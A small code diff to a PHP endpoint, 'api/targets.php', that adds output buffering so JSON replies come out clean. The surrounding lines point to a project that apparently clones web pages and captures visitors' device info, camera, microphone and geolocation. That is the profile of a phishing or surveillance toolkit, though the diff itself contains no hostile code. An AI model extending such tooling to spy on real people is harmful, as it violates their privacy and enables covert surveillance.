@@ -9,6 +9,8 @@
  *   POST   api/targets.php  (action=delete)    → remove a target
  */
 
+ob_start();
+
 require_once __DIR__ . '/../auth.php';
 require_once __DIR__ . '/../lib/cloner.php';
 require_once __DIR__ . '/../lib/store.php';
@@ -26,6 +28,7 @@ $targets_dir   = realpath(__DIR__ . '/..') . '/targets';
 $valid_modules = ['device-info', 'camera', 'microphone', 'geolocation'];
 
 function reply(int $code, array $payload): void {
+    while (ob_get_level()) ob_end_clean();
     http_response_code($code);
     echo json_encode($payload);
     exit;
